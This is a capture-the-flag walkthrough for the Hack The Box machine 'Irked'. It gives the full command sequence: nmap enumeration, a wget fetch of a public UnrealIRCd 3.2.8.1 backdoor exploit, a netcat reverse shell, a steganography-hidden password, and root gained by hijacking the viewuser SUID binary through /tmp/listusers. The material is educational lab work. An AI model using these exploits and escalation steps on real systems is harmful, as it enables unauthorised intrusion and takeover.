```

Here’s what nmap teaches us :

- port 22 (SSH) - OpenSSH 6.7p1
- port 80 (HTTP) - Apache 2.4.10
- port 111 (RPC)  - rpcbind 2-4

Running a full scan show me more ports :

```
nmap -sC -sV -oA irked.full 10.10.10.117 -v -p-
PORT      STATE SERVICE VERSION
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
53516/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
```

I found more open port which are about irc. Let's first see the website :

![Website](/assets/imgs/irked/webpage.PNG)

There is a big image and a string saying "IRC is almost working!". Let's connect to the IRC :

```
xchat --url irc://10.10.10.117:6697/
```

![Irc connected](/assets/imgs/irked/irc_connected.PNG)

One connected I see the version installed : Unreal 3.2.8.1, but nothing else interesting. Now that I have the version I'll check if there is known exploit :

![Searchsploit unrealIRC](/assets/imgs/irked/searchsploit_irc.PNG)

There is a backdoor command execution, but it's metasploit. Searching on Google about that, I found this repository : [https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor). 

## Exploit

------

Download the exploit code :

```
wget https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py
```

Start a nc listener :

```
nc -lvp 1234
```

Launch the exploit :

```
python3 exploit.py -payload python 10.10.10.117 6697
Exploit sent successfully!
```

Then go see the listener :

```
nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.4] from irked.htb [10.10.10.117] 57920
ircd@irked:~/Unreal3.2$ whoami
whoami
ircd
```

Nice, I now have a reverse shell as the user ircd ! Looking around for privilege escalation, I found this file :

```
ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Since I have done a few CTF, I know when there is steg involve, there must be an image or something. I recall that on the website there was a big image, so I download it :

```
wget http://10.10.10.117/irked.jpg
```

Then using this tool (steghide), which is a tool that I often used in CTF, I tried to extract something using the password that I found :

```
steghide extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to "pass.txt".
```

It works and extracted a file called "pass.txt"

```
cat pass.txt
Kab6h+m+bbp2J:HG
```

I now have another password. Let's try it as djmardov :

```
ircd@irked:/home/djmardov/Documents$ su djmardov
Password: 
djmardov@irked:~/Documents$ whoami
djmardov
```

Nice, I now have djmardov rights ! Once again let's try to escalate, this time to root. For that I tried a new script that I found called [suid3num](https://github.com/Anon-Exploiter/SUID3NUM), transfert it to the box :

```
python -m simpleHTTPServer
```

```
wget http://10.10.14.4:8000/suid3enum.py
```

Run it :

```
djmardov@irked:~/Documents$ suid3num.py

[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/bin/procmail                                                                                  
/usr/bin/X                                                                                  
/usr/bin/viewuser                                                           
------------------------------  

[...]
```

The interesting stuff was what I looked at. And the viewuser binary, I didn't know it, let's check it :

```
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-08-04 03:12 (:0)
sh: 1: /tmp/listusers: not found
```

I can run it, that a good sign. It's looking for a file named listusers in /tmp, so create it :

```
djmardov@irked:/tmp$ echo "/bin/bash" > listusers
djmardov@irked:/tmp$ chmod 777 listusers
```

Re-run it :

```
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-08-04 03:12 (:0)
root@irked:/tmp# whoami
root
```

And I'm root ! I can now read flags.
